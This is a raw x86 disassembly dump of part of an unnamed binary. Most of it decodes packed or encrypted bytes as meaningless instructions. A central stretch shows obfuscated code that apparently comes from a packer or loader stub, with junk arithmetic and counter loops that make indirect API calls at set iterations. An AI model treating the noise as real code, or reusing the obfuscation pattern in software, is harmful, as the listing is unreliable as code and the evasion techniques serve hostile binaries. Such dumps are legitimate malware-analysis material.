  41317a:	sbb    ecx,ebx
  41317c:	sub    bl,BYTE PTR [edx]
  41317e:	mov    eax,ds:0xdcb7d268
  413183:	pop    ss
  413184:	pop    ds
  413185:	dec    edi
  413186:	inc    ebp
  413187:	lods   al,BYTE PTR ds:[esi]
  413188:	or     esi,DWORD PTR [edi]
  41318a:	xchg   ecx,eax
  41318b:	test   eax,0x75ef551
  413190:	xor    BYTE PTR [edx+0x5a],0x34
  413194:	outs   dx,BYTE PTR ds:[esi]
  413195:	push   0x1451131a
  41319a:	loope  0x413193
  41319c:	loope  0x4131dc
  41319e:	jg     0x41321c
  4131a0:	iret   
  4131a1:	mov    ds:0x4c4afdb1,eax
  4131a6:	test   DWORD PTR [ebp+0x61],ebp
  4131a9:	pop    esi
  4131aa:	adc    BYTE PTR [eax],ah
  4131ac:	mov    ?,WORD PTR [edi]
  4131ae:	loop   0x413209
  4131b0:	mov    cl,0x6c
  4131b2:	cmp    eax,0x98c9b649
  4131b7:	add    al,0xf2
  4131b9:	adc    al,0xbc
  4131bb:	dec    edx
  4131bc:	gs jmp 0x81e9b223
  4131c2:	inc    ecx
  4131c3:	out    dx,al
  4131c4:	xchg   esi,eax
  4131c5:	xor    eax,0x653f1daf
  4131ca:	dec    ebp
  4131cb:	int    0x1a
  4131cd:	adc    BYTE PTR [ecx+0x4e779f3a],ah
  4131d3:	arpl   sp,si
  4131d5:	stos   DWORD PTR es:[edi],eax
  4131d6:	retf   0xf34d
  4131d9:	rcl    BYTE PTR [ecx+0x23],cl
  4131dc:	inc    ecx
  4131dd:	shl    BYTE PTR [ebp+0x3a],cl
  4131e0:	cmp    BYTE PTR [edx-0x40665998],dl
  4131e6:	rcl    DWORD PTR ss:[ecx+0x6c5d9b8c],cl
  4131ed:	fsubr  st(1),st
  4131ef:	pusha  
  4131f0:	and    BYTE PTR [eax],bl
  4131f2:	div    DWORD PTR [ebx-0x4b70f76c]
  4131f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4131f9:	jge    0x41323f
  4131fb:	push   ss
  4131fc:	dec    ebx
  4131fd:	inc    eax
  4131fe:	out    dx,eax
  4131ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413200:	stos   DWORD PTR es:[edi],eax
  413201:	mov    eax,ds:0x7d10f1d6
  413206:	sub    ebx,0x17
  413209:	or     BYTE PTR [ebp-0x5f],ch
  41320c:	adc    al,BYTE PTR [ebx+0x3baf04c7]
  413212:	xor    eax,0x60152c91
  413217:	ja     0x41323e
  413219:	idiv   BYTE PTR [ebx+eiz*1+0x65dd8af3]
  413220:	mov    DWORD PTR cs:[edi-0x7f],edx
  413224:	or     ah,BYTE PTR [edi+0x55]
  413227:	jnp    0x4132a8
  413229:	lods   eax,DWORD PTR ds:[esi]
  41322a:	test   DWORD PTR [ebx-0x7ab33cce],ecx
  413230:	enter  0x1a40,0xde
  413234:	or     esp,0xffffffbf
  413237:	mov    ebx,0x2adcd5bf
  41323c:	add    al,0xae
  41323e:	arpl   WORD PTR [ebp+0x5b],si
  413241:	aad    0x97
  413243:	push   ecx
  413244:	lahf   
  413245:	cdq    
  413246:	jge    0x4132bc
  413248:	adc    ecx,ebp
  41324a:	mul    DWORD PTR [ecx]
  41324c:	sub    esi,DWORD PTR [eax+0x53]
  41324f:	arpl   di,cx
  413251:	dec    ebp
  413252:	cmp    BYTE PTR [eax+ebx*1+0x2e56380b],bl
  413259:	lods   al,BYTE PTR ds:[esi]
  41325a:	dec    eax
  41325b:	call   0x4ffddc36
  413260:	les    ebx,FWORD PTR [ecx+0x784a54d2]
  413266:	sub    BYTE PTR [eax+0x36],0x3a
  41326a:	mov    WORD PTR [eax],?
  41326c:	data16 sti 
  41326e:	lods   eax,DWORD PTR ds:[esi]
  41326f:	fucomip st,st(3)
  413271:	lods   al,BYTE PTR ds:[esi]
  413272:	out    0xc5,ax
  413275:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413276:	pop    ss
  413277:	inc    edx
  413278:	repz inc ah
  41327b:	xchg   BYTE PTR [ebp+0x29],cl
  41327e:	cmc    
  41327f:	xlat   BYTE PTR ds:[ebx]
  413280:	push   ebp
  413281:	daa    
  413282:	mov    eax,DWORD PTR [edx]
  413284:	test   al,0x20
  413286:	das    
  413287:	push   esp
  413288:	jno    0x41325c
  41328a:	call   0x19f36b61
  41328f:	out    dx,al
  413290:	mov    ch,ah
  413292:	ins    DWORD PTR es:[edi],dx
  413293:	pop    ss
  413294:	inc    edi
  413295:	stc    
  413296:	jno    0x4132cb
  413298:	gs adc eax,0xc1874655
  41329e:	stc    
  41329f:	mov    al,bh
  4132a1:	call   0x714:0x5f8e0e29
  4132a8:	loop   0x413247
  4132aa:	inc    ebx
  4132ab:	push   eax
  4132ac:	or     ebx,ebp
  4132ae:	enter  0xb206,0x4d
  4132b2:	jne    0x41331f
  4132b4:	sbb    DWORD PTR [ebp+0x1],esi
  4132b7:	mov    edx,DWORD PTR [eax+0x1f]
  4132ba:	dec    esp
  4132bb:	data16 sbb cl,BYTE PTR [edi+0x6339185a]
  4132c2:	and    al,0x4f
  4132c4:	xchg   ebp,eax
  4132c5:	xor    DWORD PTR [ebp-0x24],ecx
  4132c8:	pushf  
  4132c9:	stc    
  4132ca:	jecxz  0x413339
  4132cc:	mov    al,BYTE PTR [ecx]
  4132ce:	sahf   
  4132cf:	pop    edx
  4132d0:	mov    gs,WORD PTR [eax+edx*4-0x21069eba]
  4132d7:	je     0x413355
  4132d9:	je     0x4132f4
  4132db:	dec    esp
  4132dc:	inc    edx
  4132dd:	rcr    DWORD PTR [edi],cl
  4132df:	dec    ebp
  4132e0:	xor    bh,bh
  4132e2:	dec    esi
  4132e3:	mov    esp,0x3789adf3
  4132e8:	sbb    BYTE PTR [eax+0x486210cd],0x3f
  4132ef:	pop    ebx
  4132f0:	cmp    BYTE PTR [ebx-0x4daad443],ch
  4132f6:	pop    ebx
  4132f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4132f8:	cmp    BYTE PTR [eax],bh
  4132fa:	mov    ecx,0xdc9d0404
  4132ff:	out    0x2c,eax
  413301:	jmp    0x72d3:0x7e1688cc
  413308:	xor    eax,0x9e1c8f30
  41330d:	dec    edi
  41330e:	ds mov dl,0x1a
  413311:	add    BYTE PTR [esi],cl
  413313:	dec    ebx
  413314:	mov    ebp,0xfbca4298
  413319:	dec    ebp
  41331a:	and    BYTE PTR [ecx],bl
  41331c:	daa    
  41331d:	add    BYTE PTR [ebp+0x28],0xad
  413321:	aas    
  413322:	push   ecx
  413323:	scas   al,BYTE PTR es:[edi]
  413324:	fs mov esp,0xb35232dd
  41332a:	jp     0x4133a5
  41332c:	lds    edx,FWORD PTR [eax-0x37d30f7d]
  413332:	ret    0x79f3
  413335:	mov    dl,0x7b
  413337:	push   cs
  413338:	data16 sti 
  41333a:	hlt    
  41333b:	repnz and DWORD PTR [ecx-0x71fa38f6],ecx
  413342:	push   cs
  413343:	inc    edx
  413344:	add    BYTE PTR [esi],dl
  413346:	add    BYTE PTR [eax],al
  413348:	add    BYTE PTR [ebx+0x420e8e3d],al
  41334e:	add    BYTE PTR [eax],al
  413350:	je     0x4133a5
  413356:	cmp    DWORD PTR ds:0x420e8e,0x2
  41335d:	jne    0x413373
  413363:	push   0x4d61
  413368:	push   0x424000
  41336d:	call   DWORD PTR ds:0x4247fd
  413373:	cmp    DWORD PTR ds:0x420e8e,0x3
  41337a:	jne    0x41338d
  413380:	mov    ecx,DWORD PTR ds:0x420e8e
  413386:	dec    ecx
  413387:	mov    DWORD PTR ds:0x420e8e,ecx
  41338d:	mov    ecx,DWORD PTR ds:0x420e8e
  413393:	dec    ecx
  413394:	mov    DWORD PTR ds:0x420e8e,ecx
  41339a:	jmp    0x413349
  41339f:	sbb    ecx,0x253c
  4133a5:	mov    ecx,DWORD PTR [ebp-0x14]
  4133a8:	and    DWORD PTR ds:0x42201c,0x420efc
  4133b2:	xor    ecx,eax
  4133b4:	adc    DWORD PTR ds:0x420f70,0x420ef8
  4133be:	add    ecx,esi
  4133c0:	mov    DWORD PTR [ebp-0x20],ecx
  4133c3:	mov    DWORD PTR [ebp+0x8],0xf89c85b5
  4133ca:	mov    ecx,DWORD PTR ds:0x420eec
  4133d0:	mov    DWORD PTR [ebp-0xc],0xf89c85a5
  4133d7:	mov    DWORD PTR [ebp-0x1c],0xf89c95b5
  4133de:	mov    ecx,0x748f
  4133e3:	mov    ecx,DWORD PTR [ebp-0xc]
  4133e6:	mov    DWORD PTR [ebp+0x8],ecx
  4133e9:	mov    DWORD PTR ds:0x420f68,0x5b27
  4133f3:	jmp    0x413647
  4133f8:	xor    DWORD PTR ds:0x422008,edx
  4133fe:	mov    ecx,DWORD PTR [ebp+0x8]
  413401:	sub    DWORD PTR ds:0x420fa8,0x420ef8
  41340b:	mov    edx,DWORD PTR [ebp-0x8]
  41340e:	sub    DWORD PTR ds:0x420e86,0x420f98
  413418:	xor    ecx,eax
  41341a:	sbb    DWORD PTR ds:0x420f60,0x61d9
  413424:	xor    edx,eax
  413426:	xor    DWORD PTR ds:0x420f04,0x2d2e
  413430:	sub    ecx,edx
  413432:	sub    ecx,esi
  413434:	xor    ecx,eax
  413436:	and    DWORD PTR ds:0x420e9e,0x0
  413440:	mov    edx,DWORD PTR ds:0x420e9e
  413446:	inc    edx
  413447:	mov    DWORD PTR ds:0x420e9e,edx
  41344d:	cmp    DWORD PTR ds:0x420e9e,0x5
  413454:	jne    0x41346d
  41345a:	push   0x4241e6
  41345f:	push   0x1
  413461:	push   DWORD PTR [ebp-0x10]
  413464:	push   DWORD PTR [ebp-0x28]
  413467:	call   DWORD PTR ds:0x424801
  41346d:	cmp    DWORD PTR ds:0x420e9e,0x4
  413474:	jne    0x413487
  41347a:	mov    edx,DWORD PTR ds:0x420e9e
  413480:	inc    edx
  413481:	mov    DWORD PTR ds:0x420e9e,edx
  413487:	cmp    DWORD PTR ds:0x420e9e,0x18
  41348e:	jb     0x413440
  413494:	mov    DWORD PTR [ebp+0x8],ecx
  413497:	dec    edx
  413498:	mov    ecx,DWORD PTR [ebp+0x8]
  41349b:	add    edx,DWORD PTR ds:0x420e92
  4134a1:	mov    edx,DWORD PTR [ebp-0x64]
  4134a4:	add    DWORD PTR ds:0x420fa8,0x502e
  4134ae:	lea    ecx,[edx+ecx*1+0x5708f2]
  4134b5:	and    DWORD PTR ds:0x420f64,0x0
  4134bf:	mov    edx,DWORD PTR ds:0x420f64
  4134c5:	inc    edx
  4134c6:	mov    DWORD PTR ds:0x420f64,edx
  4134cc:	cmp    DWORD PTR ds:0x420f64,0x1a
  4134d3:	jne    0x4134e7
  4134d9:	push   0x420f04
  4134de:	push   DWORD PTR [ebp-0x24]
  4134e1:	call   DWORD PTR ds:0x424805
  4134e7:	cmp    DWORD PTR ds:0x420f64,0x15
  4134ee:	jb     0x4134bf
  4134f4:	or     DWORD PTR ds:0x422008,0x1488
  4134fe:	mov    DWORD PTR [ebp-0x64],ecx
  413501:	mov    ecx,DWORD PTR [ebp+0x8]
  413504:	mov    edx,DWORD PTR [ebp-0x60]
  413507:	lea    ecx,[edx+ecx*1+0x5708f2]
  41350e:	mov    DWORD PTR [ebp-0x60],ecx
  413511:	mov    ecx,DWORD PTR [ebp+0x8]
  413514:	mov    edx,DWORD PTR ds:0x422000
  41351a:	adc    DWORD PTR ds:0x420fa4,edx
  413520:	mov    edx,DWORD PTR [ebp-0x5c]
  413523:	sbb    DWORD PTR ds:0x420fa4,0x6605
  41352d:	lea    ecx,[edx+ecx*1+0x5708f3]
  413534:	and    DWORD PTR ds:0x420f5c,0x0
  41353e:	jmp    0x413552
  413543:	xor    edx,edx
  413545:	xor    edx,DWORD PTR ds:0x420f5c
  41354b:	inc    edx
  41354c:	mov    DWORD PTR ds:0x420f5c,edx
  413552:	cmp    DWORD PTR ds:0x420f5c,0x13
  413559:	jae    0x4135ab
  41355f:	cmp    DWORD PTR ds:0x420f5c,0x5
  413566:	jne    0x41358a
  41356c:	push   DWORD PTR [ebp-0x20]
  41356f:	push   0x420f04
  413574:	push   DWORD PTR [ebp-0x20]
  413577:	push   0x4240b9
  41357c:	push   0x1238
  413581:	push   DWORD PTR [ebp-0xc]
  413584:	call   DWORD PTR ds:0x42480d
  41358a:	cmp    DWORD PTR ds:0x420f5c,0x4
  413591:	jne    0x4135a4
  413597:	mov    edx,DWORD PTR ds:0x420f5c
  41359d:	inc    edx
  41359e:	mov    DWORD PTR ds:0x420f5c,edx
  4135a4:	jmp    0x413543
  4135a9:	neg    edx
  4135ab:	mov    DWORD PTR [ebp-0x5c],ecx
  4135ae:	and    DWORD PTR ds:0x420fa4,0x0
  4135b8:	mov    edx,DWORD PTR ds:0x420fa4
  4135be:	inc    edx
  4135bf:	mov    DWORD PTR ds:0x420fa4,edx
  4135c5:	cmp    DWORD PTR ds:0x420fa4,0x20
  4135cc:	jne    0x4135d8
  4135d2:	call   DWORD PTR ds:0x424811
  4135d8:	cmp    DWORD PTR ds:0x420fa4,0x18
  4135df:	jb     0x4135b8
  4135e5:	adc    edx,0x1b19
  4135eb:	mov    ecx,DWORD PTR [ebp+0x8]
  4135ee:	mov    edx,DWORD PTR [ebp-0x58]
  4135f1:	lea    ecx,[edx+ecx*1+0x5708f0]
  4135f8:	xor    edx,DWORD PTR ds:0x420f08
  4135fe:	mov    DWORD PTR [ebp-0x58],ecx
  413601:	mov    ecx,DWORD PTR [ebp+0x8]
  413604:	xor    DWORD PTR ds:0x420f64,0x420eec
  41360e:	mov    edx,DWORD PTR [ebp-0x54]
  413611:	lea    ecx,[edx+ecx*1+0x5708f1]
  413618:	add    DWORD PTR ds:0x420f08,ebx
  41361e:	mov    DWORD PTR [ebp-0x54],ecx
  413621:	or     ecx,DWORD PTR ds:0x422018
  413627:	mov    ecx,DWORD PTR [ebp+0x8]
  41362a:	mov    edx,DWORD PTR [ebp-0x50]
  41362d:	inc    DWORD PTR ds:0x420f00
  413633:	lea    ecx,[edx+ecx*1+0x5708fe]
  41363a:	and    DWORD PTR ds:0x420e9a,0x420f6c
  413644:	mov    DWORD PTR [ebp-0x50],ecx
  413647:	inc    ecx
  413648:	mov    ecx,DWORD PTR [ebp+0x8]
  41364b:	adc    DWORD PTR ds:0x420ea2,0x68a
  413655:	xor    ecx,eax
  413657:	and    DWORD PTR ds:0x420e8e,0x1a66
  413661:	add    ecx,esi
  413663:	mov    DWORD PTR ds:0x420e92,0x4bef
  41366d:	jne    0x4133f8
  413673:	jmp    0x420dd1
  413678:	mov    ecx,DWORD PTR [ebp-0x1c]
  41367b:	mov    edx,DWORD PTR ds:0x423008
  413681:	mov    edx,DWORD PTR [edx]
  413683:	sub    DWORD PTR ds:0x420fb4,edx
  413689:	mov    edx,DWORD PTR [ebp-0x8]
  41368c:	xor    DWORD PTR ds:0x420f04,0x3196
  413696:	xor    ecx,eax
  413698:	xor    edx,eax
  41369a:	sbb    DWORD PTR ds:0x422000,0x24d3
  4136a4:	sub    ecx,edx
  4136a6:	xor    DWORD PTR ds:0x420e82,0x420e8a
  4136b0:	sub    ecx,esi
  4136b2:	xor    ecx,eax
  4136b4:	mov    DWORD PTR [ebp-0x1c],ecx
  4136b7:	mov    ecx,DWORD PTR [ebp-0xc]
  4136ba:	mov    DWORD PTR [ebp+0x8],ecx
  4136bd:	jmp    0x4136ef
  4136c2:	mov    ecx,DWORD PTR [ebp+0x8]
  4136c5:	mov    edx,DWORD PTR [ebp-0x8]
  4136c8:	xor    ecx,eax
  4136ca:	xor    edx,eax
  4136cc:	sub    ecx,edx
  4136ce:	sub    ecx,esi
  4136d0:	xor    ecx,eax
  4136d2:	mov    DWORD PTR [ebp+0x8],ecx
  4136d5:	mov    ecx,DWORD PTR [ebp+0x8]
  4136d8:	mov    edx,DWORD PTR [ebp+0x8]
  4136db:	imul   edx,edx,0x5708f2
  4136e1:	xor    ecx,eax
  4136e3:	add    ecx,esi
  4136e5:	lea    ecx,[ebp+ecx*4-0x64]
  4136e9:	mov    edi,DWORD PTR [ecx]
  4136eb:	add    edx,edi
  4136ed:	mov    DWORD PTR [ecx],edx
  4136ef:	mov    ecx,DWORD PTR [ebp+0x8]
  4136f2:	xor    ecx,eax
  4136f4:	jmp    0x415a81
  4136f9:	js     0x4136a4
  4136fb:	inc    edx
  4136fc:	iret   
  4136fd:	aaa    
  4136fe:	jae    0x41377b
  413700:	test   eax,0x7e5a8e7d
  413705:	jmp    0x4136e3
  413707:	mov    dl,0xa9
  413709:	mov    esi,0xa7a7a73
  41370e:	pop    edi
  41370f:	jp     0x41378b
  413711:	enter  0x2fe2,0x1c
  413715:	xor    DWORD PTR [ebx-0x4fdd224d],0xffffffed
  41371c:	pop    edx
  41371d:	pop    eax
  41371e:	jae    0x413713
  413720:	add    ebx,esp
  413722:	xchg   esp,eax
  413723:	mov    ah,0xd9
  413725:	scas   al,BYTE PTR es:[edi]
  413726:	jae    0x41375d
  413728:	enter  0x3c22,0x98
  41372c:	xchg   ebp,eax
  41372d:	sub    eax,0xa96e707b
  413732:	(bad)  
  413733:	push   edx
  413734:	enter  0x5699,0xa2
  413738:	inc    eax
  413739:	mov    al,0x20
  41373b:	xchg   edx,eax
  41373c:	add    DWORD PTR [ebx],ecx
  41373e:	data16 fwait
  413740:	sbb    bh,BYTE PTR [ebx-0x68]
  413743:	loopne 0x4136d8
  413745:	fimul  DWORD PTR [ecx+0x71]
  413748:	stos   BYTE PTR es:[edi],al
  413749:	test   BYTE PTR [edi],bh
  41374b:	out    0x5f,al
  41374d:	mov    edx,0x739d4ae6
  413752:	pop    eax
  413753:	xor    DWORD PTR [eax-0x4e],edi
  413756:	(bad)  
  413757:	ds jnp 0x4137c2
  41375a:	in     eax,0xe4
  41375c:	xchg   esp,eax
  41375d:	adc    esp,0x95b2ea8a
  413763:	push   es
  413764:	xchg   ecx,eax
  413765:	cwde   
  413766:	or     ch,dh
  413768:	stos   DWORD PTR es:[edi],eax
  413769:	rol    DWORD PTR [ecx],1
  41376b:	push   ebx
  41376c:	in     eax,dx
  41376d:	int    0xbe
  41376f:	cmp    bl,bh
  413771:	jmp    0x4137ae
  413773:	push   ebx
  413774:	or     esi,DWORD PTR [edi-0x3fdbd337]
  41377a:	stc    
  41377b:	mov    edx,0x4f74b191
  413780:	push   eax
  413781:	mov    bh,cl
  413783:	ss jge 0x41371a
  413786:	lock out 0xce,eax
  413789:	out    0x9e,eax
  41378b:	sub    ecx,edi
  41378d:	pushf  
  41378e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41378f:	aam    0x56
  413791:	dec    ebx
  413792:	and    ebx,0x7a
  413795:	or     esi,esi
  413797:	mov    ds:0x2849e6e,eax
  41379c:	ror    edx,cl
  41379e:	or     al,0xfe
  4137a0:	dec    edi
  4137a1:	int3   
  4137a2:	adc    DWORD PTR [ebp+0x6a],esi
  4137a5:	bound  esi,QWORD PTR [ecx-0x68c7b6e]
  4137ab:	or     DWORD PTR [ecx+0x370fb07f],0xb
  4137b2:	aam    0xf5
  4137b4:	mov    edi,0x3c67790
  4137b9:	sub    esp,DWORD PTR [edx+eax*8+0x3d]
  4137bd:	sub    DWORD PTR [edx-0x7a],ecx
  4137c0:	pop    ebx
  4137c1:	cmp    al,0x88
  4137c3:	mov    ecx,0x48bbf863
  4137c8:	cmp    esi,edx
  4137ca:	inc    ecx
  4137cb:	ficomp WORD PTR [edi+eiz*2-0x30]
  4137cf:	jl     0x41378d
  4137d1:	in     eax,0xf3
  4137d3:	pop    esp
  4137d4:	(bad)  
  4137d5:	std    
  4137d6:	adc    ecx,esi
  4137d8:	sti    
  4137d9:	mov    eax,ds:0x3d4e2a55
  4137de:	mov    edx,0xd2df7fe2
  4137e3:	xor    BYTE PTR [ebx-0x5f1223b],0x31
  4137ea:	sbb    BYTE PTR [ecx],0x9c
  4137ed:	xchg   ebx,eax
  4137ee:	lods   al,BYTE PTR ds:[esi]
  4137ef:	sbb    al,0xd1
  4137f1:	call   0x7949:0xcf8e2158
  4137f8:	and    DWORD PTR [esi],esp
  4137fa:	mov    al,ds:0xfa1386e8
  4137ff:	xchg   ecx,eax
  413801:	(bad)  [ecx]
  413803:	push   ecx
  413804:	mov    ds:0xc169a2ae,al
  413809:	in     al,dx
  41380a:	fdiv   DWORD PTR [eax-0x32]
  41380d:	xchg   ecx,eax
  41380e:	or     BYTE PTR [esi],dh
  413810:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413811:	push   eax
  413812:	add    ebx,esi
  413814:	out    0xef,eax
  413816:	sub    eax,0xec2d41cc
  41381b:	lea    ebp,[ecx+0x27]
  41381e:	imul   ecx,DWORD PTR [edi],0x55
  413821:	ret    
  413822:	xchg   BYTE PTR [ebx+eiz*4-0x18fa04ff],ch
  413829:	(bad)  
  41382a:	std    
  41382b:	mov    bl,0x1
  41382d:	xchg   edi,eax
  41382e:	aas    
  41382f:	mov    dl,0x5
  413831:	not    DWORD PTR [esi+0x506ffdfa]
  413837:	fcom   DWORD PTR ss:[ebx-0x9d783bf]
  41383e:	xor    BYTE PTR ds:0x76dea86f,bl
  413844:	xchg   esp,eax
  413845:	shl    BYTE PTR [ecx-0x4c],1
  413848:	dec    esi
  413849:	mov    bh,0x9c
  41384b:	xor    al,0xaa
  41384d:	inc    ebx
  41384e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41384f:	sbb    al,0xd3
  413851:	or     al,0x3b
  413853:	add    dl,BYTE PTR [ecx]
  413855:	fild   QWORD PTR [ebp+0x40]
  413858:	pop    ebp
  413859:	les    edi,FWORD PTR [esi]
  41385b:	retf   
  41385c:	jg     0x4137f3
  41385e:	inc    edx
  41385f:	inc    ebp
  413860:	cld    
  413861:	jnp    0x41389b
  413863:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413864:	sbb    al,BYTE PTR [edx+ebx*1]
  413867:	loopne 0x4138b4
  413869:	aas    
  41386a:	enter  0x6ad6,0x19
  41386e:	xchg   esp,eax
  41386f:	push   eax
  413870:	inc    ecx
  413871:	xor    DWORD PTR [edi+0x81f8d18],eax
  413877:	test   al,0x13
  413879:	or     edx,esi
  41387b:	shr    DWORD PTR [ebx],0xe
  41387e:	xchg   edx,eax
  41387f:	lock stos DWORD PTR es:[edi],eax
  413881:	inc    esi
  413882:	lods   al,BYTE PTR ds:[esi]
  413883:	mov    al,ah
  413885:	jb     0x41388f
  413887:	cmp    al,0x2c
  413889:	sub    ebx,DWORD PTR [edx+eax*4]
  41388c:	leave  
  41388d:	fsub   st,st(5)
  41388f:	jns    0x41389d
  413891:	jne    0x4138b0
  413893:	in     al,0xdd
  413895:	shr    DWORD PTR ds:0xde158404,1
  41389b:	cmp    eax,0x61fd6826
  4138a0:	push   ebp
  4138a1:	sub    BYTE PTR [eax+ecx*1],cl
  4138a4:	fwait
  4138a5:	sbb    al,0x54
  4138a7:	sub    esp,DWORD PTR [esi]
  4138a9:	sub    BYTE PTR [edi],dh
  4138ab:	inc    BYTE PTR [edx-0x4f2c118]
  4138b1:	sbb    eax,0x256dfb9d
  4138b6:	test   DWORD PTR [eax-0x390a06b7],esp
  4138bc:	mov    edx,DWORD PTR [esi+0x57]
  4138bf:	sub    DWORD PTR [ecx],esp
  4138c1:	pop    edx
  4138c2:	stc    
  4138c3:	inc    eax
  4138c4:	fisubr DWORD PTR [ecx+eiz*1+0x5c9f8522]
  4138cb:	lods   eax,DWORD PTR fs:[esi]
  4138cd:	adc    eax,0xdc84f3c5
  4138d2:	(bad)  
  4138d3:	pop    es
  4138d4:	sbb    ch,bh
  4138d6:	pop    ds
  4138d7:	out    0xd0,al
  4138d9:	call   0xdcaa:0x16265d9b
  4138e0:	sbb    eax,0xa47807
  4138e5:	sbb    al,0x41
  4138e7:	inc    dh
  4138e9:	push   es
  4138ea:	adc    ah,BYTE PTR [esi+esi*1]
  4138ed:	stos   DWORD PTR es:[edi],eax
  4138ee:	(bad)  
  4138ef:	icebp  
  4138f0:	mov    eax,0xd3528851
  4138f5:	shl    BYTE PTR [eax+0x22],cl
  4138f8:	xor    ebx,ecx
  4138fa:	div    BYTE PTR [ebx+0x2c58a51c]
  413900:	(bad)  
  413901:	lods   al,BYTE PTR ds:[esi]
  413902:	into   
  413903:	push   ss
  413904:	xor    al,0x47
  413906:	adc    edx,DWORD PTR [esi-0x45]
  413909:	and    al,0x56
  41390b:	outs   dx,DWORD PTR ds:[esi]
  41390c:	inc    esi
  41390d:	jns    0x41396a
  41390f:	sub    ah,BYTE PTR [edx+0x1f918f16]
  413915:	aas    
  413916:	ins    BYTE PTR es:[edi],dx
  413917:	je     0x413917
  413919:	push   0x35
  41391b:	mov    al,0x87
  41391d:	xchg   DWORD PTR [ebx],ecx
  41391f:	inc    eax
  413920:	mov    dl,BYTE PTR [ebx-0x36]
  413923:	push   es
  413924:	mov    ecx,0x862f2fe2
  413929:	mov    ebx,0x111cba42
  41392e:	in     al,dx
  41392f:	int    0x60
  413931:	or     ah,BYTE PTR [esi]
  413933:	addr16 jle 0x41396c
  413936:	not    bh
  413938:	mov    ?,WORD PTR [edx+0x43]
  41393b:	outs   dx,BYTE PTR ds:[esi]
  41393c:	ss xchg ah,cl
  41393f:	cmp    BYTE PTR [esi],bh
  413941:	jb     0x41398d
  413943:	push   ebx
  413944:	pop    ebx
  413945:	or     edx,esi
  413947:	fldenv [edi-0x447850e1]
  41394d:	cwde   
  41394e:	mov    dl,0xc4
  413950:	bound  edx,QWORD PTR [eax]
  413952:	push   0x1f
  413954:	mov    cl,0x5c
  413956:	inc    edi
  413957:	xchg   ebp,eax
  413958:	pusha  
  413959:	in     al,dx
  41395a:	daa    
  41395b:	or     ah,BYTE PTR [ecx-0x39]
  41395e:	hlt    
  41395f:	push   cs
  413960:	or     al,0x9a
  413962:	and    eax,edx
  413964:	lods   al,BYTE PTR ds:[esi]
  413965:	push   es
  413966:	mov    esi,0x53ddf26a
  41396b:	shr    DWORD PTR [edx-0x21],1
  41396e:	lods   eax,DWORD PTR ds:[esi]
  41396f:	ret    
  413970:	cmp    ebp,esi
  413972:	pop    esi
  413973:	aaa    
  413974:	enter  0x9f5c,0xa5
  413978:	fdivr  QWORD PTR [ebx+0x69]
  41397b:	pop    esi
  41397c:	mov    dh,0x42
  41397e:	add    esi,edx
  413980:	sbb    al,0x46
  413982:	cmp    eax,0xa118a3aa
  413987:	xchg   DWORD PTR [ecx+eax*2],edi
  41398a:	je     0x413952
  41398c:	das    
  41398d:	or     ah,BYTE PTR [eax+ebx*8]
  413990:	lds    ecx,FWORD PTR [edi]
  413992:	faddp  st(3),st
  413994:	aam    0x78
  413996:	cmp    BYTE PTR [esp+ecx*8-0x65],cl
  41399a:	inc    edx
  41399b:	ss inc ebp
  41399d:	imul   esp,esp,0xfffffffb
  4139a0:	mov    ebx,0x7a0ff81e
  4139a5:	loop   0x41392e
  4139a7:	push   ecx
  4139a8:	lods   eax,DWORD PTR ds:[esi]
  4139a9:	mov    es,WORD PTR [edi+0x2ed4acf8]
  4139af:	repz adc cl,BYTE PTR [edx]
  4139b2:	pop    ebp
  4139b3:	pop    ds
  4139b4:	or     eax,esp
  4139b6:	gs out dx,eax
  4139b8:	sub    al,0x4a
  4139ba:	jge    0x413988
  4139bc:	mov    BYTE PTR [ecx],bl
  4139be:	aam    0x6d
  4139c0:	sub    DWORD PTR [esi-0x5a],edx
  4139c3:	push   cs
  4139c4:	xchg   ecx,eax
  4139c5:	test   DWORD PTR ds:0x4a552b40,ecx
  4139cb:	mov    ds:0x1c2580cb,al
  4139d0:	jnp    0x4139d0
  4139d2:	ja     0x413a2f
  4139d4:	pop    ebx
  4139d5:	sahf   
  4139d6:	mov    ebx,cs
  4139d8:	inc    eax
  4139d9:	fadd   st(6),st
  4139db:	or     al,0x59
  4139dd:	cmp    al,0x9a
  4139df:	dec    eax
  4139e0:	or     edi,DWORD PTR [eax+0x21d44b5b]
  4139e6:	or     bh,cl
  4139e8:	mov    al,0x72
  4139ea:	pop    es
  4139eb:	je     0x4139ed
  4139ed:	inc    edx
  4139ee:	cli    
  4139ef:	clc    
  4139f0:	sbb    BYTE PTR [esi],0x9e
  4139f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4139f4:	and    BYTE PTR [ecx+ebp*4],bh
  4139f7:	out    dx,al
  4139f8:	out    dx,al
  4139f9:	sti    
  4139fa:	test   eax,0x56bdcf9d
  4139ff:	push   ss
  413a00:	mov    al,ds:0xeb920510
  413a05:	std    
  413a06:	adc    eax,0x8310a8d6
  413a0b:	inc    eax
  413a0c:	cmp    BYTE PTR [edx+0x1d],dh
  413a0f:	repz jb 0x413a6c
  413a12:	sbb    al,0xd3
  413a14:	push   cs
  413a15:	inc    ebx
  413a16:	adc    BYTE PTR [ecx],0x1
  413a19:	dec    ecx
  413a1a:	sub    ecx,DWORD PTR [ebp+eax*4-0x66e70f11]
  413a21:	sar    BYTE PTR [edx+edi*2+0x7b87fbab],0xf6
  413a29:	cwde   
  413a2a:	outs   dx,BYTE PTR ds:[esi]
  413a2b:	inc    eax
  413a2c:	rcr    ebx,1
  413a2e:	inc    ecx
  413a2f:	int3   
  413a30:	daa    
  413a31:	push   edx
  413a32:	rcr    DWORD PTR [esp+ebx*8],0xa8
  413a36:	push   ebx
  413a37:	mov    ecx,0x23f1890a
  413a3d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413a3e:	add    ch,dl
  413a40:	cld    
  413a41:	je     0x413a4a
  413a43:	ins    DWORD PTR es:[edi],dx
  413a44:	loopne 0x413a4f
  413a46:	adc    al,0x93
  413a48:	jbe    0x4139e5
  413a4a:	pop    ebp
  413a4b:	pop    edi
